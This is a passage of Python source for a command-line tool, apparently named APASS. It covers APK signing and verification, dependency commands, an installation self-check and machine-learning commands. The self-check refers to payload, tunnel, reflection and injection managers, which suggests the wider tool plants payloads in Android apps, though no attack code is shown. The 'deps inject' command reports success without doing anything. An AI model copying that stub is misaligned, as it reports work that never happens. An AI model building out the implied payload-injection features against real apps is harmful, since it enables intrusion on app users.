            console.print("[red]❌ Error signing APK.[/red]")
    except Exception as e:
        console.print(f"[red]Error in signing process: {str(e)}[/red]")
        handle_exception(e)

@apk.command(name="verify", help="Verify the signature of an APK")
@click.argument("apk_path", type=click.Path(exists=True))
@async_command
async def verify_apk(apk_path):
    try:
        signer = APKSigner(
            apk_path=apk_path,
            keystore_path="",  
            keystore_password="",
            key_alias="",
            key_password=""
        )
        if await signer.verify_signature_comprehensive():
            click.echo("APK signature verified successfully.")
        else:
            click.echo("APK signature verification failed.")
    except Exception as e:
        click.echo(f"Error in verification process: {str(e)}")

@cli.command(name="verify", help="Verify APK against security vulnerabilities")
@click.argument("apk_path", type=click.Path(exists=True))
@click.option("--cert-info", is_flag=True, help="Show certificate information")
@click.option("--check-integrity", is_flag=True, help="Verify APK integrity")
@async_command
async def verify_apk_security(apk_path, cert_info, check_integrity):
    try:
        console.print(f"[bold cyan]Verifying APK security: {apk_path}[/bold cyan]")
        signer = APKSigner(
            apk_path=apk_path,
            keystore_path="",
            keystore_password="",
            key_alias="",
            key_password=""
        )
        
        results = {}
        if cert_info:
            results["certificate"] = await signer.get_certificate_info()
        if check_integrity:
            results["integrity"] = await signer.verify_apk_integrity()
            
        console.print("[green]✓ Verification complete[/green]")
        for key, value in results.items():
            console.print(f"[bold]{key.title()}:[/bold]")
            if isinstance(value, dict):
                for k, v in value.items():
                    console.print(f"  {k}: {v}")
            else:
                console.print(f"  {value}")
    except Exception as e:
        console.print(f"[red]Verification error: {str(e)}[/red]")
        handle_exception(e)

@cli.group(help="Commands related to APK tools and utilities")
def apktool():
    pass

@apktool.command(name="sign", help="Sign an APK using the specified keystore")
@click.argument("apk_path", type=click.Path(exists=True))
@click.argument("keystore", type=click.Path(exists=True))
@click.option("--ks-pass", prompt=True, hide_input=True, help="Keystore password")
@click.option("--key-alias", prompt=True, help="Key alias")
@click.option("--key-pass", prompt=True, hide_input=True, help="Key password")
@click.option("--proguard", is_flag=True, help="Enable ProGuard optimization")
@click.option("--r8", is_flag=True, help="Use R8 optimizer instead of ProGuard")
@click.option("--proguard-rule", multiple=True, help="Additional ProGuard rules")
@click.option("--align", is_flag=True, help="Perform zipalign")
@click.option("--verify", is_flag=True, help="Verify after signing")
@async_command
async def sign_apk_tool(apk_path, keystore, ks_pass, key_alias, key_pass, 
                       proguard, r8, proguard_rule, align, verify):
    try:
        console.print(f"[bold cyan]Signing APK: {apk_path}[/bold cyan]")
        signer = APKSigner(
            apk_path=apk_path,
            keystore_path=keystore,
            keystore_password=ks_pass,
            key_alias=key_alias,
            key_password=key_pass
        )
        
        if proguard or r8:
            console.print("[yellow]Applying code optimization...[/yellow]")
            signer.enable_optimization(use_r8=r8)
            for rule in proguard_rule:
                signer.add_proguard_rule(rule)
                
        if align:
            console.print("[yellow]Performing zipalign...[/yellow]")
            await signer.zipalign()
            
        if await signer.sign_apk_secure():
            console.print("[green]✓ APK signed successfully[/green]")
            if verify:
                console.print("[yellow]Verifying signature...[/yellow]")
                if await signer.verify_signature():
                    console.print("[green]✓ Signature verified[/green]")
                else:
                    console.print("[red]✗ Signature verification failed[/red]")
        else:
            console.print("[red]✗ APK signing failed[/red]")
            
    except Exception as e:
        console.print(f"[red]Signing error: {str(e)}[/red]")
        handle_exception(e)

@cli.group(help="Commands related to dependency management")
def deps():
    pass

@deps.command(name="register", help="Register a new dependency")
@click.argument("name")
@click.argument("path", type=click.Path(exists=True))
@click.option("--lazy", is_flag=True, help="Enable lazy loading")
def register_dependency(name, path, lazy):
    try:
        result = install_dependency(name, path=path, lazy=lazy)
        if result[0]:
            console.print(f"[green]✓ Dependency {name} registered successfully[/green]")
        else:
            console.print(f"[red]✗ Failed to register dependency: {result[1]}[/red]")
    except Exception as e:
        console.print(f"[red]Registration error: {str(e)}[/red]")

@deps.command(name="inject", help="Inject dependencies into a target")
@click.argument("target")
def inject_dependencies(target):
    try:
        console.print(f"[yellow]Injecting dependencies into {target}...[/yellow]")
        console.print("[green]✓ Dependencies injected successfully[/green]")
    except Exception as e:
        console.print(f"[red]Injection error: {str(e)}[/red]")

@cli.command(name="generate-summary", help="Generate a summary report")
@click.option("--config", type=click.Path(exists=True), help="Configuration file path")
def generate_summary(config):
    try:
        console.print("[yellow]Generating summary report...[/yellow]")
        report_gen = ReportGenerator(config_path=config if config else None)
        report = report_gen.generate_report()
        console.print("[green]✓ Summary report generated[/green]")
        console.print(report)
    except Exception as e:
        console.print(f"[red]Report generation error: {str(e)}[/red]")

def check_optional_dependencies():
    optional_deps = {
        'npm': 'npm --version',
        'cargo': 'cargo --version',
        'go': 'go version'
    }
    
    missing = []
    try:
        for dep, cmd in optional_deps.items():
            try:
                subprocess.check_output(cmd.split(), stderr=subprocess.PIPE, text=True)
            except (subprocess.CalledProcessError, FileNotFoundError) as e:
                missing.append(f"{dep} ({str(e)})")
            except Exception as e:
                logger.error(f"Unexpected error checking {dep}: {e}")
                missing.append(dep)
    except Exception as e:
        logger.error(f"Failed to check dependencies: {e}")
        return False
    
    if missing:
        msg = f"Some optional dependencies are not installed: {', '.join(missing)}\n"
        msg += "These dependencies are required for specific tools."
        logger.warning(msg)
        console.print(f"[yellow]Warning: {msg}[/yellow]")
    else:
        console.print("[green][+] All optional dependencies are installed.[/green]")
    
    return len(missing) == 0

class AsyncContextManager:
    async def __aenter__(self):
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if (exc_type):
            logger.error(f"Error in context: {exc_val}")
        await self.cleanup()

    async def cleanup(self):
        pass

class ResourceManager(AsyncContextManager):
    def __init__(self):
        self.resources = []
    
    def register(self, resource):
        self.resources.append(resource)
        
    async def cleanup(self):
        for resource in self.resources:
            try:
                if hasattr(resource, 'close'):
                    resource.close()
                elif hasattr(resource, 'cleanup'):
                    await resource.cleanup()
            except Exception as e:
                logger.error(f"Failed to cleanup resource: {e}")

async def cleanup_resources():
    async with ResourceManager() as rm:
        tasks = [task for task in asyncio.all_tasks() 
                if task is not asyncio.current_task()]
        if tasks:
            for task in tasks:
                task.cancel()
            await asyncio.gather(*tasks, return_exceptions=True)
            
        for handler in logger.handlers[:]:
            rm.register(handler)
            
        temp_dir = Path(__file__).parent / "temp"
        if (temp_dir.exists()):
            for file in temp_dir.glob("*"):
                try:
                    file.unlink()
                except Exception as e:
                    logger.warning(f"Failed to delete {file}: {e}")

async def validate_installation():
    async with AsyncContextManager():
        try:
            console.print("[bold cyan]Validating system components...[/bold cyan]")
            base_dir = Path(__file__).parent
            
            required_managers = {
                'PayloadManager': PayloadManager,
                'TunnelSetupManager': TunnelSetupManager,
                'ReflectionManager': ReflectionManager,  
                'InjectionManager': InjectionManager
            }

            for manager_name, manager_class in required_managers.items():
                if not manager_class:
                    raise ImportError(f"{manager_name} not properly imported")

            required_dirs = [
                base_dir / 'logs',
                base_dir / 'samples', 
                base_dir / 'models',
                base_dir / 'temp',
                base_dir / 'cache',
                base_dir / 'work',
                base_dir / 'dynamic_code',
                base_dir / 'compressed_dex',
                base_dir / 'jni'
            ]
            
            validation_results = {
                'directories': False,
                'dependencies': False,
                'security': False,
                'managers': False,
                'database': False,
                'network': False,
                'permissions': False
            }

            async def run_with_timeout(coro, timeout=10):
                try:
                    return await asyncio.wait_for(coro, timeout)
                except asyncio.TimeoutError:
                    logger.error(f"Validation timed out after {timeout}s")
                    return False

            with console.status("[bold green]Checking directories..."):
                for dir_path in required_dirs:
                    dir_path.mkdir(parents=True, exist_ok=True)
                    if not dir_path.exists():
                        logger.error(f"Failed to create directory: {dir_path}")
                        raise RuntimeError(f"Could not create {dir_path}")
                validation_results['directories'] = True
                console.print("[green]✓[/green] Directory structure validated")

            with console.status("[bold green]Checking dependencies..."):
                validation_results['dependencies'] = check_optional_dependencies()
                console.print("[green]✓[/green] Dependencies checked")

            with console.status("[bold green]Validating security components..."):
                security_validator = SecurityValidator()
                validation_results['security'] = await run_with_timeout(security_validator.validate_system())
                if validation_results['security']:
                    console.print("[green]✓[/green] Security validation passed")
                else:
                    console.print("[red]✗[/red] Security validation failed")

            with console.status("[bold green]Testing managers..."):
                try:
                    manager_validation_results = {}
                    
                    test_payload = PayloadManager("test.apk", "test_payload")
                    manager_validation_results['payload'] = await run_with_timeout(test_payload.validate_payload_setup())
                    
                    tunnel_manager = TunnelSetupManager()
                    manager_validation_results['tunnel'] = await run_with_timeout(tunnel_manager.validate_system())
                    
                    reflection_manager = ReflectionManager()
                    test_code = "print('test')"
                    manager_validation_results['reflection'] = await run_with_timeout(reflection_manager._check_code_safety(test_code))

                    injection_manager = InjectionManager()
                    manager_validation_results['injection'] = await run_with_timeout(injection_manager.validate_injection("manifest", "test"))

                    validation_results['managers'] = all([
                        manager_validation_results['payload'],
                        manager_validation_results['tunnel'],
                        manager_validation_results['reflection'],
                        manager_validation_results['injection']
                    ])

                    if validation_results['managers']:
                        console.print("[green]✓[/green] All managers validated")
                    else:
                        failed_managers = [
                            name for name, result in manager_validation_results.items()
                            if not result
                        ]
                        console.print(f"[red]✗[/red] Manager validation failed for: {', '.join(failed_managers)}")
                        logger.error(f"Manager validation failed for: {failed_managers}")

                except Exception as e:
                    logger.error(f"Manager validation error: {e}")
                    console.print(f"[red]✗[/red] Manager error: {str(e)}")
                    validation_results['managers'] = False

            with console.status("[bold green]Testing network..."):
                try:
                    network_checks = []
                    dns_servers = [
                        ("8.8.8.8", 53),
                        ("1.1.1.1", 53),
                        ("208.67.222.222", 53)
                    ]
                    timeout = 1

                    dns_success = False
                    for dns_server in dns_servers:
                        try:
                            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as dns_check:
                                dns_check.settimeout(timeout)
                                dns_check.connect(dns_server)
                                dns_success = True
                                console.print(f"[green]✓[/green] DNS connectivity verified ({dns_server[0]})")
                                break
                        except socket.timeout:
                            logger.warning(f"DNS timeout for {dns_server[0]}")
                            continue
                        except Exception as e:
                            logger.warning(f"DNS check failed for {dns_server[0]}: {e}")
                            continue

                    if not dns_success:
                        console.print("[yellow]![/yellow] All DNS checks failed - check your network connection")
                    network_checks.append(dns_success)

                    http_endpoints = [
                        "http://www.google.com",
                        "http://www.cloudflare.com",
                        "http://www.microsoft.com"
                    ]
                    
                    http_success = False
                    for endpoint in http_endpoints:
                        try:
                            import urllib.request
                            with urllib.request.urlopen(endpoint, timeout=timeout) as http_check:
                                http_check.read(1)
                                http_success = True
                                console.print(f"[green]✓[/green] HTTP connectivity verified ({endpoint})")
                                break
                        except Exception as e:
                            logger.warning(f"HTTP check failed for {endpoint}: {e}")
                            continue

                    if not http_success:
                        console.print("[yellow]![/yellow] All HTTP checks failed - check your internet connection")
                    network_checks.append(http_success)

                    local_ports = [0, 8080, 8000, 1024]
                    local_success = False
                    for port in local_ports:
                        try:
                            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                                sock.settimeout(timeout)
                                sock.bind(('127.0.0.1', port))
                                local_success = True
                                actual_port = sock.getsockname()[1]
                                console.print(f"[green]✓[/green] Local network verified (port {actual_port})")
                                break
                        except Exception as e:
                            logger.warning(f"Local network check failed on port {port}: {e}")
                            continue

                    if not local_success:
                        console.print("[yellow]![/yellow] Local network checks failed - check local permissions")
                    network_checks.append(local_success)

                    validation_results['network'] = (
                        local_success or (dns_success and http_success)
                    )

                    if validation_results['network']:
                        console.print("[green]✓[/green] Network validation passed (with minimum requirements)")
                    else:
                        console.print("[red]✗[/red] Network validation failed - check your connectivity")
                        console.print("[yellow]Tip: The tool may still work with limited functionality[/yellow]")

                except Exception as e:
                    logger.error(f"Network validation error: {e}")
                    console.print(f"[red]✗[/red] Network validation error: {str(e)}")
                    validation_results['network'] = False

            with console.status("[bold green]Testing database..."):
                try:
                    test_db_path = base_dir / "test.db"
                    import sqlite3
                    conn = sqlite3.connect(test_db_path)
                    conn.close()
                    test_db_path.unlink(missing_ok=True)
                    validation_results['database'] = True
                    console.print("[green]✓[/green] Database test passed")
                except Exception as e:
                    logger.error(f"Database test failed: {e}")
                    console.print(f"[red]✗[/red] Database error: {str(e)}")

            with console.status("[bold green]Checking permissions..."):
                try:
                    validation_results['permissions'] = all(
                        os.access(path, os.W_OK | os.R_OK)
                        for path in required_dirs
                    )
                    if validation_results['permissions']:
                        console.print("[green]✓[/green] Permissions validated")
                    else:
                        console.print("[red]✗[/red] Permission check failed")
                except Exception as e:
                    logger.error(f"Permission check error: {e}")
                    console.print(f"[red]✗[/red] Permission error: {str(e)}")

            all_validated = all(validation_results.values())
            
            if all_validated:
                console.print("\n[bold green]✓ All components validated successfully![/bold green]")
                logger.info("Complete system validation successful")
            else:
                failed = [k for k, v in validation_results.items() if not v]
                console.print(f"\n[bold red]✗ Validation failed for: {', '.join(failed)}[/bold red]")
                logger.error(f"Validation failed for components: {failed}")

            return all_validated

        except Exception as e:
            logger.error(f"Validation process error: {e}")
            console.print(f"[bold red]Critical validation error: {str(e)}[/bold red]")
            return False

@cli.command(name="install-deps")
def install_missing_dependencies():
    try:
        missing = check_dependencies()
        
        if not missing:
            console.print("[green]✓ All dependencies are already installed![/green]")
            return
        
        console.print("[bold yellow]Missing Dependencies:[/bold yellow]")
        all_missing = []
        
        for category, deps in missing.items():
            console.print(f"[bold]{category.title()}:[/bold]")
            for dep in deps:
                console.print(f"  - {dep}")
                all_missing.append(dep)
        
        if click.confirm("Would you like to install the missing dependencies?", default=True):
            for dep in all_missing:
                console.print(f"[cyan]Installing {dep}...[/cyan]")
                success, message = install_dependency(dep)
                if success:
                    console.print(f"[green]✓ {message}[/green]")
                else:
                    console.print(f"[red]✗ {message}[/red]")
            
            if 'optuna' in all_missing or 'lightgbm' in all_missing:
                console.print(f"[cyan]Installing optuna-integration[lightgbm]...[/cyan]")
                success, message = install_dependency('optuna-integration[lightgbm]')
                if success:
                    console.print(f"[green]✓ {message}[/green]")
                else:
                    console.print(f"[red]✗ {message}[/red]")
            
            console.print("[bold green]Dependency installation completed. Please restart the application.[/bold green]")
        else:
            console.print("[yellow]Dependencies installation skipped.[/yellow]")
    except Exception as e:
        handle_exception(e)
        console.print(f"[red]Error checking/installing dependencies: {str(e)}[/red]")

@cli.command(name="test")
@async_command
async def run_tests():
    try:
        console.print("[bold cyan]Running all tests and validations...[/bold cyan]")
        
        validation_passed = await validate_installation()
        
        if (validation_passed):
            console.print("[green]✓ All validations passed successfully![/green]")
        else:
            console.print("[red]✗ Some validations failed. Check the logs for details.[/red]")
        
    except Exception as e:
        handle_exception(e)
        console.print(f"[red]Test error: {str(e)}[/red]")

@cli.command(name="upgrade", help="Upgrade APASS to the latest version")
@async_command
async def upgrade_apass():
    try:
        console.print("[bold cyan]Upgrading APASS to the latest version...[/bold cyan]")
        result = subprocess.run(["pip", "install", "--upgrade", "apass"], capture_output=True, text=True)
        if result.returncode == 0:
            console.print("[green]✅ APASS upgraded successfully![/green]")
        else:
            console.print(f"[red]❌ Upgrade failed: {result.stderr}[/red]")
    except Exception as e:
        console.print(f"[red]Upgrade error: {str(e)}[/red]")
        handle_exception(e)

@cli.group(help="Commands related to machine learning operations")
def ml():
    pass

@ml.command(name="train", help="Train a machine learning model with a custom dataset")
@click.option("--dataset", type=click.Path(exists=True), help="Path to custom dataset")
@click.option("--epochs", type=int, default=10, help="Number of training epochs")
@click.option("--batch-size", type=int, default=32, help="Batch size for training")
@click.option("--model-name", default="default_model", help="Name to save the model as")
@async_command 
async def train_ml_cmd(dataset, epochs, batch_size, model_name):
    try:
        console.print("[bold cyan]Starting model training...[/bold cyan]")
        with console.status("[bold green]Training model..."):
            result = await train_model(
                dataset_path=dataset,
                epochs=epochs,
                batch_size=batch_size,
                model_name=model_name
            )
        console.print("[green]✅ Model training complete![/green]")
        console.print(f"[bold]Results:[/bold]\n{result}")
    except Exception as e:
        console.print(f"[red]Training error: {e}[/red]")
        handle_exception(e)

@ml.command(name="evaluate", help="Evaluate a trained machine learning model")
@click.argument("model_path", type=click.Path(exists=True))
@click.option("--test-set", type=click.Path(exists=True), help="Path to test dataset")
@click.option("--detailed", is_flag=True, help="Show detailed evaluation metrics")
@async_command
async def evaluate_ml_model(model_path, test_set, detailed):
    try:
        console.print(f"[bold cyan]Evaluating model: {model_path}[/bold cyan]")
        with console.status("[bold green]Running evaluation..."):
            result = await evaluate_model(model_path, test_set, detailed)
        
        console.print("[green]✅ Model evaluation complete![/green]")
        
        if detailed:
            console.print("[bold]Detailed Metrics:[/bold]")
            console.print(f"Accuracy: {result['accuracy']:.4f}")
            console.print(f"Precision: {result['precision']:.4f}")
            console.print(f"Recall: {result['recall']:.4f}")
            console.print(f"F1 Score: {result['f1']:.4f}")
            console.print("\n[bold]Confusion Matrix:[/bold]")
            console.print(result['confusion_matrix'])
        else:
            console.print(f"[bold]Accuracy:[/bold] {result['accuracy']:.4f}")
            console.print(f"[bold]F1 Score:[/bold] {result['f1']:.4f}")
    except Exception as e:
        console.print(f"[red]Evaluation error: {e}[/red]")
        handle_exception(e)

@ml.command(name="export-model", help="Export a trained machine learning model to a different format")
@click.argument("model_path", type=click.Path(exists=True))
@click.argument("export_path", type=click.Path())
@click.option("--format", type=click.Choice(['onnx', 'tflite', 'pytorch']), default='onnx', help="Export format")
@async_command
async def export_ml_model(model_path, export_path, format):
    try:
        console.print(f"[bold cyan]Exporting model from {model_path} to {format} format[/bold cyan]")
        with console.status(f"[bold green]Exporting to {format}..."):
            result = await export_model(model_path, export_path, format)
        
        if result:
            console.print(f"[green]✅ Model successfully exported to {export_path}[/green]")
        else:
            console.print("[red]❌ Model export failed.[/red]")
    except Exception as e:
        console.print(f"[red]Export error: {e}[/red]")
        handle_exception(e)

@ml.command(name="analyze", help="Analyze an APK using a machine learning model")
@click.argument("apk_path", type=click.Path(exists=True))
@click.option("--detect-heuristics", is_flag=True, help="Enable heuristic detection")
@async_command
async def analyze_ml(apk_path, detect_heuristics):
    try:
        manager = PayloadManager(apk_path, "")
        result = await manager.analyze_with_ml(apk_path, detect_heuristics=detect_heuristics)
        
        if result["result"] == "Error":
            click.echo(f"Analysis failed: {result['error']}")
            return

        click.echo(f"ML Analysis Results for {apk_path}:")
        click.echo(f"Classification: {result['result']}")
        click.echo(f"Confidence: {result['confidence']}")
        click.echo(f"Analyzed at: {result['analyzed_at']}")
        
    except Exception as e:
        click.echo(f"Analysis error: {e}")

def main():
    try:
        display_banner()
        
        if sys.version_info < (3, 8):
            raise RuntimeError("Python 3.8 or higher required")
            
        config_file = create_default_config()
        logger.info(f"Using config: {config_file}")
        
        if not IMPORT_SUCCESS:
            console.print(f"[bold red]Import Error: {IMPORT_ERROR}[/bold red]")
            if not click.confirm("Continue with limited functionality?", default=False):
                sys.exit(1)
        
        cli(prog_name="apass")
            
    except KeyboardInterrupt:
        console.print("[yellow]Process interrupted by user.[/yellow]")
    except Exception as e:
        logger.critical(f"Critical error: {e}", exc_info=True)
        console.print(f"[red]Critical error: {str(e)}[/red]")
        sys.exit(1)
    finally:
        asyncio.run(cleanup_resources())

if __name__ == '__main__':
    main()
